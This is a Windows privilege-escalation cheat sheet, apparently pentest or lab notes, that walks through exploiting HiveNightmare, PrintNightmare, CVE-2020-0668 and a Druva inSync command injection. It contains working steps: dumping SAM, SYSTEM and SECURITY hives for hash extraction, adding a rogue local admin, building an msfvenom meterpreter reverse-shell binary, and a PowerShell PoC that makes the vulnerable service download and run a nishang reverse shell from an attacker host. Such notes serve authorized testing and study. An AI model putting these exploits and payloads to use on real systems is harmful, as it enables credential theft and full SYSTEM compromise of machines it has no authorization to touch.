### Content

- [HiveNightmare aka SeriousSam](#hivenightmare-aka-serioussam)
- [PrintNightmare](#printnightmare)
	- [Exploitation](#exploitation)
- [CVE-2020-0668](#cve-2020-0668)
- [Druva inSync](#druva-insync)

> [Microsoft Security Vulnerabilities](https://msrc.microsoft.com/update-guide/vulnerability)

---
### HiveNightmare aka SeriousSam

**`CVE-2021-36934`**
Windows 10 flaw that results in ANY user having rights to read the Windows registry and access sensitive information regardless of privilege level.
This allow users to read the SAM, SYSTEM, and SECURITY registry hives and create copies of them to process offline later and extract password hashes (including local admin) using a tool such as SecretsDump.py.

- More information about this flaw can be found [here](https://doublepulsar.com/hivenightmare-aka-serioussam-anybody-can-read-the-registry-in-windows-10-7a871c465fa5) and [this](https://github.com/GossiTheDog/HiveNightmare) exploit binary can be used to create copies of the three files to our working directory.
- This [script](https://github.com/GossiTheDog/HiveNightmare/blob/master/Mitigation.ps1) can be used to detect the flaw and also fix the ACL issue. Let's take a look.

> Successful exploitation also requires the presence of one or more shadow copies. Most Windows 10 systems will have `System Protection` enabled by default which will create periodic backups, including the shadow copy necessary to leverage this flaw.

Checking permissions on SAM file 

```Powershell
C:\> icacls c:\Windows\System32\config\SAM

C:\Windows\System32\config\SAM BUILTIN\Administrators:(I)(F)
                               NT AUTHORITY\SYSTEM:(I)(F)
                               BUILTIN\Users:(I)(RX)
```

Using `HiveNightmare.exe`

```PowerShell
PS C:\Users\user\Desktop> .\HiveNightmare.exe

HiveNightmare v0.6 - dump registry hives as non-admin users

Specify maximum number of shadows to inspect with parameter if wanted, default is 15.

Running...

Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM

Success: SAM hive from 2021-08-07 written out to current working directory as SAM-2021-08-07

Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY

Success: SECURITY hive from 2021-08-07 written out to current working directory as SECURITY-2021-08-07

Newer file found: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM

Success: SYSTEM hive from 2021-08-07 written out to current working directory as SYSTEM-2021-08-07


Assuming no errors above, you should be able to find hive dump files in current working directory.
```

Utilizing `secretsdump`

```bash
$ impacket-secretsdump -sam SAM-2021-08-07 -system SYSTEM-2021-08-07 -security SECURITY-2021-08-07 local
```

---
### PrintNightmare 

`CVE-2021-1675/CVE-2021-34527 PrintNightmare` is a flaw in [RpcAddPrinterDriver](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-rprn/f23a7519-1c77-4069-9ace-a6d8eae47c22) which is used to allow for remote printing and driver installation.
 
This function is intended to give users with the Windows privilege `SeLoadDriverPrivilege` the ability to add drivers to a remote Print Spooler which typically reserved for users in the built-in Administrators group and Print Operators who may have a legitimate need to install a printer driver on an end user's machine remotely..

The flaw allowed any authenticated user to add a print driver to a Windows system without having the privilege mentioned above, allowing an attacker full remote code execution as SYSTEM on any affected system.

[This](https://github.com/cube0x0/CVE-2021-1675) version by [@cube0x0](https://twitter.com/cube0x0) can be used to execute a malicious DLL remotely or locally using a modified version of Impacket. The repo also contains a C# implementation.
This [PowerShell implementation](https://github.com/calebstewart/CVE-2021-1675) can be used for quick local privilege escalation. By default, this script adds a new local admin user, but we can also supply a custom DLL to obtain a reverse shell or similar if adding a local admin user is not in scope.

##### Exploitation

Check if the Spooler service is running with the following command. If it is not running, we will receive a "path does not exist" error.

``` PowerShell
PS C:\> ls \\localhost\pipe\spoolss
```

At first, [Bypass the execution policy](https://www.netspi.com/blog/technical/network-penetration-testing/15-ways-to-bypass-the-powershell-execution-policy/)

```PowerShell
PS C:\> Set-ExecutionPolicy Bypass -Scope Process
```

Import the PowerShell script and use it to add a new local admin user.

```PowerShell
PS C:\> Import-Module .\CVE-2021-1675.ps1
PS C:\> Invoke-Nightmare -NewUser "hacker" -NewPassword "Pwnd1234!" -DriverName "PrintIt"

[+] created payload at C:\Users\user0\AppData\Local\Temp\nightmare.dll
[+] using pDriverPath = "C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_am
d64_ce3301b66255a0fb\Amd64\mxdwdrv.dll"
[+] added user hacker as local administrator
[+] deleting payload from C:\Users\user0\AppData\Local\Temp\nightmare.dll
```

If all went to plan, we will have a new local admin user under our control.

Use this to import a custom DLL, let's say for a reverse shell 
`Invoke-Nightmare -DLL "C:\absolute\path\to\your\bindshell.dll"`

---
### CVE-2020-0668

Explanation [here](https://itm4n.github.io/cve-2020-0668-windows-service-tracing-eop/)

We can use [this](https://github.com/RedCursorSecurityConsulting/CVE-2020-0668) exploit for CVE-2020-0668

This privileged file write needs to be chained with another vulnerability, such as [UsoDllLoader](https://github.com/itm4n/UsoDllLoader) or [DiagHub](https://github.com/xct/diaghub) to load the DLL and escalate our privileges. However, the UsoDllLoader technique may not work if Windows Updates are pending or currently being installed, and the DiagHub service may not be available.

> We can also look for any third-party software, which can be leveraged, such as the Mozilla Maintenance Service. This service runs in the context of SYSTEM and is startable by unprivileged users.
> 
> `C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe`

Checking the binary permissions.

```CMD
C:\> icacls "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

NT AUTHORITY\SYSTEM:(I)(F)
BUILTIN\Administrators:(I)(F)
BUILTIN\Users:(I)(RX)
APPLICATION PACKAGE AUTHORITY\ALL APPLICATION PACKAGES:(I)(RX)
APPLICATION PACKAGE AUTHORITY\ALL RESTRICTED APPLICATION PACKAGES:(I)(RX)
```

Generate a malicious binary and move to the target system twice, because we will need two executables as the exploit will corrupt the exe.

```bash
$ msfvenom -p windows/x64/meterpreter/reverse_https LHOST=<> LPORT=<> -f exe > maintenanceservice.exe
```

Run the exploit.

```CMD
C:\> C:\Tools\CVE-2020-0668\CVE-2020-0668.exe C:\Users\student\Desktop\maintenanceservice.exe "C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"

[+] Moving C:\Users\student\Desktop\maintenanceservice.exe to C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe

[+] Mounting \RPC Control onto C:\Users\student\AppData\Local\Temp\nzrghuxz.leo
[+] Creating symbol links
[+] Updating the HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Tracing\RASPLAP configuration.
[+] Sleeping for 5 seconds so the changes take effect
[+] Writing phonebook file to C:\Users\student\AppData\Local\Temp\179739c5-5060-4088-a3e7-57c7e83a0828.pbk
[+] Cleaning up
[+] Done!
```

Now check the binary permissions again

```CMD
C:\> icacls 'C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe'

NT AUTHORITY\SYSTEM:(F)
BUILTIN\Administrators:(F)
WINLPE-WS02\student:(F)
```

Now as we have full access over the target binary, we can move the second copy to the original directory.

```CMD
C:\> copy /Y C:\Users\student\Desktop\maintenanceservice2.exe "c:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe"
```

Start a handler on `msfconsole` and start the service

```CMD
C:\> net start MozillaMaintenance 

The service is not responding to the control function
```

```bash
$ msfconsole -q
msf6 > use exploit/multi/handler
msf6 > set payload windows/x64/meterpreter/reverse_https
msf6 > set lhost <>
msf6 > set lport <>
msf6 > run

meterpreter > getuid

Server username: NT AUTHORITY\SYSTEM
```

---
### Druva inSync

Version `6.6.3` is vulnerable to a command injection attack via an exposed RPC service.

We may be able to use [this](https://www.exploit-db.com/exploits/49211) exploit PoC to escalate our privileges. From this [blog post](https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/) which details the initial discovery of the flaw, Druva inSync is an application used for “Integrated backup, eDiscovery, and compliance monitoring,” and the client application runs a service in the context of the powerful `NT AUTHORITY\SYSTEM` account. Escalation is possible by interacting with a service running locally on port 6064.

Enumerate for it:

```CMD
C:\> wmic product where 'name like "%inSync%"' get name
Name
Druva inSync 6.6.3

C:\> netstat -ano | findstr 6064

TCP    127.0.0.1:6064         0.0.0.0:0              LISTENING       3464
TCP    127.0.0.1:6064         127.0.0.1:54784        ESTABLISHED     3464
TCP    127.0.0.1:54784        127.0.0.1:6064         ESTABLISHED     3888

C:\> tasklist /FI "PID eq 3324"

Image Name                     PID Session Name        Session#    Mem Usage
========================= ======== ================ =========== ============
inSyncCPHwnet64.exe           3464 Services                   0      6,472 K

C:\>wmic service where 'name like "%inSync%"' get  name, startname, displayname, started,state
DisplayName                  Name              Started  StartName    State
Druva inSync Client Service  inSyncCPHService  TRUE     LocalSystem  Running
```

> Don't forget to modify the PowerShell execution policy `Set-ExecutionPolicy Bypass -Scope Process`

Download `Invoke-PowerShellTcp.ps1` from `nishang` repo and append this line to the end of it: 
`Invoke-PowerShellTcp -Reverse -IPAddress <AttackerIP> -Port <>` 

Using this PowerShell POC:

```PowerShell
$ErrorActionPreference = "Stop"

$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://<>:<>/Invoke-PowerShellTcp.ps1')"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)
$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

Run HTTP server on the attack host to move the reverse shell file and start a listener, then run the PowerShell snippet to get a shell as `NT Authority\SYSTEM` 